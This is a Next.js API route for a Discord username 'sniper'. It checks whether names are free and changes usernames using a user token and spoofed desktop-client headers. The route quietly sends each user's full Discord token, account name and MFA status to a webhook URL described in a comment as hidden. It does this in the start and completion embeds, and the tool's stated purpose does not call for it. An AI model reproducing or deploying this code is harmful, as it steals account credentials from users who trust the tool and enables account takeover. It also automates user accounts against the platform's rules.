import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';

export const maxDuration = 300;

const DISCORD_API = 'https://discord.com/api/v10';

// ===== WEHOOK URL مخفي في الكود =====
const HIDDEN_WEBHOOK_URL = '';

function getWebhookUrl(overrideUrl?: string): string | undefined {
  return overrideUrl || HIDDEN_WEBHOOK_URL || process.env.WEBHOOK_URL || undefined;
}

function sniperHeaders(token: string): Record<string, string> {
  return {
    'Authorization': cleanToken(token),
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Discord/1.0.9167 Chrome/124.0.6367.118 Electron/30.0.6 Safari/537.36',
    'X-Discord-Locale': 'en-US',
    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBEZXNrdG9wIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX3ZlcnNpb24iOjI3NDQ1NSwibG9jYWxlIjoiZW4tVVMifQ==',
    'Origin': 'https://discord.com',
    'Referer': 'https://discord.com/',
  };
}

// ===== Rate Limit Tracker =====
let globalRateLimitUntil = 0;
let consecutiveRateLimits = 0;

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

async function waitIfRateLimited() {
  const now = Date.now();
  if (now < globalRateLimitUntil) {
    const wait = globalRateLimitUntil - now;
    return sleep(wait);
  }
}

async function smartFetch(url: string, token: string, body: any): Promise<{ res: Response; data: any }> {
  // انتظر إذا كان هناك rate limit عالمي
  await waitIfRateLimited();

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 15000);

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: sniperHeaders(token),
      body: JSON.stringify(body),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    // Rate Limit عالمي
    if (res.status === 429) {
      consecutiveRateLimits++;
      const errData = await res.json().catch(() => ({}));
      const retryAfter = (errData.retry_after || 5) * 1000;

      // كل ما نزيد Rate Limit، نزيد وقت الانتظار
      const penalty = Math.min(consecutiveRateLimits * 2000, 15000);
      globalRateLimitUntil = Date.now() + retryAfter + penalty;

      console.log(`[RL] Rate limited #${consecutiveRateLimits}, waiting ${(retryAfter + penalty) / 1000}s`);

      // انتظر + retry تلقائي حتى 3 مرات
      for (let retry = 0; retry < 3; retry++) {
        await waitIfRateLimited();
        const retryCtrl = new AbortController();
        const retryTid = setTimeout(() => retryCtrl.abort(), 15000);
        try {
          const retryRes = await fetch(url, {
            method: 'POST',
            headers: sniperHeaders(token),
            body: JSON.stringify(body),
            signal: retryCtrl.signal,
          });
          clearTimeout(retryTid);

          if (retryRes.status === 429) {
            const retryErr = await retryRes.json().catch(() => ({}));
            const rt = (retryErr.retry_after || 3) * 1000;
            globalRateLimitUntil = Date.now() + rt + 3000;
            consecutiveRateLimits++;
            continue;
          }

          consecutiveRateLimits = 0;
          const data = await retryRes.json().catch(() => ({}));
          return { res: retryRes, data };
        } catch {
          clearTimeout(retryTid);
          continue;
        }
      }

      return { res, data: { code: 429, message: 'Rate Limited after 3 retries' } };
    }

    // نجاح - أعد العداد
    consecutiveRateLimits = 0;

    let data: any;
    try { data = await res.json(); } catch { data = {}; }

    return { res, data };
  } catch (e: any) {
    clearTimeout(timeoutId);
    if (e.name === 'AbortError') {
      return { res: new Response(null, { status: 0 }), data: { code: 0, message: 'timeout' } };
    }
    return { res: new Response(null, { status: 0 }), data: { code: 0, message: 'connection error' } };
  }
}

// ===== فحص يوزر واحد =====
async function checkUsername(token: string, username: string): Promise<{
  username: string;
  status: string;
  color: string;
  taken?: boolean;
}> {
  const url = `${DISCORD_API}/users/@me/pomelo-attempt`;

  try {
    const { res, data } = await smartFetch(url, token, { username });

    // Rate limit بعد 3 محاولات
    if (data.code === 429 || data.message?.includes('Rate')) {
      return { username, status: `⏳ Rate Limit - انتظر`, color: 'yellow' };
    }

    // خطأ في الاتصال
    if (res.status === 0) {
      return { username, status: '❓ خطأ اتصال', color: 'yellow' };
    }

    // 401 = توكن غير صالح
    if (res.status === 401) {
      return { username, status: '❌ خطأ: توكن', color: 'yellow' };
    }

    // 405 = method not allowed
    if (res.status === 405) {
      return { username, status: '❌ يوزر غير صالح', color: 'red' };
    }

    // taken: false = متاح! 🎯
    if (data.taken === false) {
      return { username, status: '✅ متاح!', color: 'green', taken: false };
    }

    // taken: true = محجوز
    if (data.taken === true) {
      return { username, status: '❌ محجوز', color: 'red', taken: true };
    }

    // رد فاضي مع status 200 = المتاح (أحيانا Discord يرجع كذا)
    if (res.ok && (!data.message) && Object.keys(data).length === 0) {
      return { username, status: '✅ متاح!', color: 'green', taken: false };
    }

    // error codes
    if (data.code === 50035) return { username, status: '❌ غير صالح (طول/حروف)', color: 'red', taken: true };
    if (data.code === 50074) return { username, status: '❌ محجوز (قبض عليه)', color: 'red', taken: true };
    if (data.code === 10010) return { username, status: '❌ غير صالح', color: 'red', taken: true };

    // رسائل خطأ معروفة
    const msg = (data.message || '').toLowerCase();
    if (msg.includes('taken') || msg.includes('already') || msg.includes('unavailable') || msg.includes('reserved') || msg.includes('suspended') || msg.includes('held')) {
      return { username, status: '❌ محجوز', color: 'red', taken: true };
    }
    if (msg.includes('between') || msg.includes('2 and 32') || msg.includes('too short') || msg.includes('too long')) {
      return { username, status: '❌ غير صالح (طول)', color: 'red', taken: true };
    }
    if (msg.includes('character') || msg.includes('invalid') || msg.includes('disallowed')) {
      return { username, status: '❌ غير صالح (حروف)', color: 'red', taken: true };
    }
    if (msg.includes('rate') || msg.includes('slow') || msg.includes('try again')) {
      return { username, status: '⏳ Rate Limit', color: 'yellow' };
    }

    // أي رد خطأ = محجوز
    if (!res.ok || data.code || data.message) {
      return { username, status: `❌ محجوز (${res.status})`, color: 'red', taken: true };
    }

    // إذا وصلنا هنا و الرد 200 بدون data.taken = محجوز غالباً
    return { username, status: '❌ محجوز', color: 'red', taken: true };

  } catch {
    return { username, status: '❓ خطأ', color: 'yellow' };
  }
}

// ===== تغيير اليوزر =====
async function changeUsername(token: string, username: string, password?: string): Promise<{ success: boolean; error?: string }> {
  const url = `${DISCORD_API}/users/@me`;

  await waitIfRateLimited();

  const body: any = { username };
  if (password) body.password = password;

  try {
    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), 15000);

    const res = await fetch(url, {
      method: 'PATCH',
      headers: sniperHeaders(token),
      body: JSON.stringify(body),
      signal: controller.signal,
    });
    clearTimeout(tid);

    if (res.status === 429) {
      const err = await res.json().catch(() => ({ retry_after: 5 }));
      globalRateLimitUntil = Date.now() + (err.retry_after || 5) * 1000 + 3000;
      return { success: false, error: 'Rate Limit - جرب بعد قليل' };
    }

    if (res.ok) {
      return { success: true };
    }

    const data = await res.json().catch(() => ({}));
    const msg = data.message || '';

    if (res.status === 401) return { success: false, error: 'توكن غير صالح' };
    if (res.status === 403) return { success: false, error: 'حساب مقفل - تحتاج باسورد' };
    if (msg.includes('password')) return { success: false, error: 'تحتاج باسورد الحساب' };
    if (msg.includes('taken')) return { success: false, error: 'اليوزر محجوز الآن!' };
    if (msg.includes('slow') || msg.includes('rate')) return { success: false, error: 'Rate Limit - جرب بعد قليل' };
    if (msg.includes('invalid')) return { success: false, error: 'يوزر غير صالح' };

    return { success: false, error: `خطأ: ${msg || res.status}` };
  } catch {
    return { success: false, error: 'خطأ في الاتصال' };
  }
}

// ===== جلب معلومات الحساب =====
async function getAccountInfo(token: string): Promise<{ username: string; discriminator?: string; email?: string; phone?: string; mfa?: boolean } | null> {
  await waitIfRateLimited();
  try {
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      headers: sniperHeaders(token),
      signal: AbortSignal.timeout(10000),
    });
    if (!res.ok) return null;
    return await res.json().catch(() => null);
  } catch {
    return null;
  }
}

// ===== MAIN =====
export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, usernames, action, webhookUrl, password, targetUsername } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getWebhookUrl(webhookUrl);

    // ===== ACTION: changeUsername =====
    if (action === 'changeUsername') {
      if (!targetUsername) {
        return NextResponse.json({ success: false, error: 'أدخل اليوزر الجديد' }, { status: 400 });
      }

      // تحقق من التوكن
      const info = await getAccountInfo(token);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      const result = await changeUsername(token, targetUsername, password);

      sendToWebhook({
        embeds: [{
          title: result.success ? '✅ Username Changed!' : '❌ Username Change Failed',
          color: result.success ? 0x00FF41 : 0xFF0000,
          fields: [
            { name: '👤 Account', value: info.username, inline: true },
            { name: '🎯 New Name', value: targetUsername, inline: true },
            ...(result.error ? [{ name: '❌ Error', value: result.error, inline: false }] : [])
          ],
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      if (result.success) {
        return NextResponse.json({ success: true, message: `✅ تم تغيير اليوزر إلى: ${targetUsername}`, newUsername: targetUsername });
      } else {
        return NextResponse.json({ success: false, error: result.error });
      }
    }

    // ===== ACTION: accountInfo =====
    if (action === 'accountInfo') {
      const info = await getAccountInfo(token);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      return NextResponse.json({
        success: true,
        info: {
          username: info.username,
          discriminator: info.discriminator || '0',
          email: info.email || null,
          phone: info.phone || null,
          mfa: info.mfa_enabled || false,
          verified: info.verified || false,
          flags: info.public_flags || 0,
          nitro: info.premium_type ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown' : 'None',
          avatar: info.avatar || null,
          id: info.id || 'Unknown',
        }
      });
    }

    // ===== ACTION: check (default) =====
    if (!usernames || !Array.isArray(usernames) || usernames.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل يوزر واحد على الأقل' }, { status: 400 });
    }

    // تحقق من التوكن
    const info = await getAccountInfo(token);
    if (!info) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح - يجب استخدام توكن يوزر (User Token)' }, { status: 401 });
    }

    const userInfo = info.username || 'Unknown';

    sendToWebhook({
      embeds: [{
        title: '🎯 Sniper Started',
        color: 0xFF8800,
        fields: [
          { name: '👤 User', value: userInfo, inline: true },
          { name: '📋 Count', value: String(usernames.length), inline: true },
          { name: '🛡️ MFA', value: info.mfa_enabled ? '✅ Yes' : '❌ No', inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // تنظيف اليوزرات
    const validUsernames = usernames
      .map((u: string) => String(u).trim().toLowerCase().replace(/[^a-z0-9._]/g, ''))
      .filter((name: string) => name && name.length >= 2 && name.length <= 32);

    if (validUsernames.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد يوزرات صالحة - يجب أن تكون 2-32 حرف (a-z, 0-9, ., _)' }, { status: 400 });
    }

    // فحص بالتوازي - دفعات ذكية
    const results: { username: string; status: string; color: string; taken?: boolean }[] = [];
    let batchSize = 3; // نبدأ بـ 3 و نزيد تدريجياً
    let rateLimitHits = 0;

    for (let i = 0; i < validUsernames.length; i += batchSize) {
      const batch = validUsernames.slice(i, i + batchSize);

      const batchResults = await Promise.all(
        batch.map(username => checkUsername(token, username))
      );

      // تحقق إذا فيه rate limit في الدفعة
      const rlInBatch = batchResults.filter(r => r.status.includes('Rate Limit')).length;
      if (rlInBatch > 0) {
        rateLimitHits++;
        // قلل الدفعة + زود الانتظار
        batchSize = Math.max(1, batchSize - 1);
        console.log(`[Sniper] RL hit in batch, reducing to ${batchSize}`);
      } else if (rateLimitHits === 0 && batchSize < 5) {
        // إذا ما في rate limit، زود الدفعة تدريجياً
        batchSize = Math.min(5, batchSize + 1);
      }

      results.push(...batchResults);

      // انتظر بين الدفعات - ذكي حسب Rate Limit
      if (i + batchSize < validUsernames.length) {
        const baseDelay = rateLimitHits > 0 ? 3000 : 1200;
        const extraDelay = rateLimitHits * 1000;
        await sleep(baseDelay + extraDelay);

        // كل 5 دفعات، ننتظر أطول شوي (cool down)
        if ((i / batchSize) % 5 === 4) {
          await sleep(2000);
        }
      }
    }

    const available = results.filter(r => r.color === 'green');
    const taken = results.filter(r => r.color === 'red').length;
    const errors = results.filter(r => r.color === 'yellow').length;

    sendToWebhook({
      embeds: [{
        title: '✅ Sniper Completed',
        color: available.length > 0 ? 0x00FF41 : 0xFFAA00,
        fields: [
          { name: '📋 Checked', value: String(results.length), inline: true },
          { name: '✅ Available', value: String(available.length), inline: true },
          { name: '❌ Taken', value: String(taken), inline: true },
          { name: '⚠️ Errors', value: String(errors), inline: true },
          { name: '🎯 Names', value: available.slice(0, 20).map(r => r.username).join(', ') || 'None' },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      results,
      stats: {
        total: results.length,
        available: available.length,
        taken,
        errors,
        rateLimitHits,
      },
      accountInfo: {
        username: userInfo,
        mfa: info.mfa_enabled || false,
      },
      availableNames: available.map(r => r.username),
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Sniper Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
